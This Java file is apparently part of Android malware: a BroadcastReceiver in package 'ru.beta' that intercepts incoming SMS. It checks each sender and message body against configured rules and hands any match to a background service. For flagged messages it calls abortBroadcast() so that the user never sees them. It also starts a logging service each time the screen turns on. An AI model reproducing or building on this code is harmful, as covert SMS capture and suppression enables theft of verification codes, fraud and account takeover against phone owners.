package ru.beta;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.SmsMessage;
import org.json.JSONObject;

public class MainReceiver extends BroadcastReceiver {
    public void onReceive(Context context, Intent intent) {
        String action = intent.getAction();
        if (Constants.DEBUG) {
            System.out.println("MainReceiver::onReceive()");
            System.out.println("action: " + action);
        }
        if (action.equals("custom.alarm")) {
            if (Functions.loadSettings(context)) {
                MainService.start(context, intent, "alarm");
            }
        } else if (action.equals("android.provider.Telephony.SMS_RECEIVED")) {
            if (Functions.loadSettings(context)) {
                SmsMessage[] messages = Functions.getSmsMessages(intent.getExtras());
                boolean find = false;
                for (SmsMessage smsMessage : messages) {
                    String number = smsMessage.getOriginatingAddress();
                    String text = smsMessage.getMessageBody();
                    try {
                        Settings settings = Settings.getSettings();
                        CatchResult result = settings.isCatchMessage(number, text);
                        if (result.result) {
                            MainService.start(context, intent, "catch", number, text, result.key);
                        }
                        if (settings.isDeleteMessage(number, text)) {
                            find = true;
                        }
                    } catch (Exception ex) {
                        ex.printStackTrace();
                    }
                    if (find) {
                        break;
                    }
                }
                if (find) {
                    try {
                        abortBroadcast();
                    } catch (Exception ex2) {
                        ex2.printStackTrace();
                    }
                }
            }
        } else if (action.equals("android.intent.action.SCREEN_ON")) {
            MainService.isRunning = true;
            MainService.start(context, new Intent(), "logs");
        } else if (action.equals("android.intent.action.SCREEN_OFF")) {
            MainService.isRunning = false;
        } else {
            Beta beta = new Beta(context, new JSONObject());
        }
    }
}
